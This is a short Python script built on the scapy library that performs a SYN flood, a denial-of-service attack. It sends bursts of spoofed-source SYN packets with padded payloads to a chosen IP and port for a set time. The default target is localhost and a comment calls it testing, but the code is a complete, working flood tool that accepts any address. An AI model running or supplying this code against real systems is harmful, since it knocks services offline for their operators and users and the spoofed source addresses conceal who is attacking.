#!/usr/bin/env python3
from scapy.all import *

import random
import time

def intensive_syn_flood(target_ip, target_port, duration=30):
    """Generate high-intensity SYN flood attack"""
    end_time = time.time() + duration
    packet_count = 0
    
    while time.time() < end_time:
        # Create multiple packets per iteration
        for _ in range(10):  # Send 10 packets per loop
            src_ip = ".".join(str(random.randint(1, 254)) for _ in range(4))
            src_port = random.randint(1024, 65535)
            
            # Craft SYN packet with larger payload
            ip_packet = IP(src=src_ip, dst=target_ip)
            tcp_packet = TCP(sport=src_port, dport=target_port, flags="S", seq=random.randint(1000, 9000))
            payload = Raw(load="X" * 100)  # Add payload to increase packet size
            
            send(ip_packet/tcp_packet/payload, verbose=0)
            packet_count += 1
        
        # Reduce delay for higher packet rate
        time.sleep(0.0001)  # Very small delay
    
    print(f"Sent {packet_count} SYN packets to {target_ip}:{target_port}")

# Target your local machine or test server
target_ip = "127.0.0.1"  # Localhost for testing
intensive_syn_flood(target_ip, 80, 30)
